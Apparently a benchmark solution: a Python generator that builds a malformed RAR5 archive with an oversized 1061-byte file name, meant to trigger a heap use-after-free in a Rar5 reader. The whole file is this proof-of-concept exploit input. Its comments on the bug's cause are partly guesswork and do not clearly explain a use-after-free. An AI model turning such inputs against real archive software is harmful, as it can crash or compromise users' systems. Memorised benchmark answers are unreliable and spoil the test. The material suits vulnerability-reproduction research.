import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in the Rar5 reader.
        The vulnerability occurs because the reader reads the name size, reads the name into memory,
        and then checks if the size exceeds the maximum allowed.
        """
        # RAR5 Signature: 52 61 72 21 1A 07 01 00
        sig = b'\x52\x61\x72\x21\x1A\x07\x01\x00'

        def to_vint(n):
            out = bytearray()
            if n == 0:
                return b'\x00'
            while n > 0:
                byte = n & 0x7F
                n >>= 7
                if n > 0:
                    byte |= 0x80
                out.append(byte)
            return bytes(out)

        def make_block(type_val, flags, body_data):
            # Block structure:
            # CRC32 (4 bytes)
            # Size (VINT) - Size of (Type + Flags + Body)
            # Type (VINT)
            # Flags (VINT)
            # Body
            
            type_bytes = to_vint(type_val)
            flags_bytes = to_vint(flags)
            
            # The Size field value is the length of the remaining data
            content = type_bytes + flags_bytes + body_data
            size_val = len(content)
            size_bytes = to_vint(size_val)
            
            # CRC is calculated over the Size field and the content
            crc_data = size_bytes + content
            crc = zlib.crc32(crc_data) & 0xFFFFFFFF
            
            return struct.pack('<I', crc) + crc_data

        # 1. Main Archive Header (Type 1)
        # Flags = 0 (No extra fields like ArchiveFlags or ExtraSize)
        mh = make_block(1, 0, b'')

        # 2. File Header (Type 2)
        # Flags = 0 (No Extra Area, No Data Area, No UTime, No DataCRC)
        # Structure of body for Flags=0:
        #   FileAttributes (VINT)
        #   CompressionInfo (VINT)
        #   HostOS (VINT)
        #   NameLength (VINT)
        #   Name (Bytes)
        
        file_attrs = 0
        comp_info = 0
        host_os = 0
        
        # Calculate name length to match the ground truth PoC size of 1089 bytes.
        # Overhead breakdown:
        # Signature: 8 bytes
        # Main Header: 4(CRC) + 1(Size) + 1(Type) + 1(Flags) = 7 bytes
        # File Header Base: 4(CRC) + 2(Size) + 1(Type) + 1(Flags) = 8 bytes (Size is > 127, so 2 bytes)
        # File Header Body Fixed: 1(Attr) + 1(Comp) + 1(OS) + 2(NameLen) = 5 bytes (NameLen > 127)
        # Total Overhead: 8 + 7 + 8 + 5 = 28 bytes.
        # Required Name Size: 1089 - 28 = 1061 bytes.
        # This size (1061) should exceed the internal limit (likely 1024) to trigger the vulnerability check.
        
        name_len = 1061
        name = b'A' * name_len
        
        fh_body = to_vint(file_attrs) + to_vint(comp_info) + to_vint(host_os) + to_vint(name_len) + name
        
        fh = make_block(2, 0, fh_body)

        return sig + mh + fh